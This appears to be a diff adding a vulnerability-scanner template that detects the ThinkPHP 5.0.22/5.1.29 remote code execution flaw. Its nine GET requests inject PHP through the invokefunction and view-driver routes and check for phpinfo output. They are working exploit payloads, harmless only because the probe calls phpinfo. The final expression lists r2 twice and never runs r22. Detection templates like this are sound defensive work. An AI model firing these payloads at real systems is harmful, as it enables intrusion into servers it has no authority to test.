@@ -1,0 +1,57 @@
+id: thinkphp-5022-5129-rce
+
+info:
+  name: ThinkPHP 5.0.22 RCE
+  author: zan8in
+  severity: critical
+  description: Thinkphp5 5.0.22/5.1.29 Remote Code Execution if the website doesn't have mandatory routing enabled (which is default).
+  reference: 
+    - https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: "/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
+        expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+    r1:
+        request:
+            method: GET
+            path: "/?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
+        expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+    r2:
+        request:
+            method: GET
+            path: "/?s=/index/\\think\\view\\driver\\php/display&content=<?php%20phpinfo();?>"
+        expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+    r00:
+        request:
+            method: GET
+            path: "/?s=/admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
+        expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+    r11:
+        request:
+            method: GET
+            path: "/?s=/admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
+        expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+    r22:
+        request:
+            method: GET
+            path: "/?s=/admin/\\think\\view\\driver\\php/display&content=<?php%20phpinfo();?>"
+        expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+    r000:
+        request:
+            method: GET
+            path: "/?s=/api/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
+        expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+    r111:
+        request:
+            method: GET
+            path: "/?s=/api/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"
+        expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+    r222:
+        request:
+            method: GET
+            path: "/?s=/api/\\think\\view\\driver\\php/display&content=<?php%20phpinfo();?>"
+        expression: response.status == 200 && response.body.bcontains(b'PHP Extension') && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
+expression: r0() || r1() || r2() || r00() || r11() || r2() || r000() || r111() || r222()
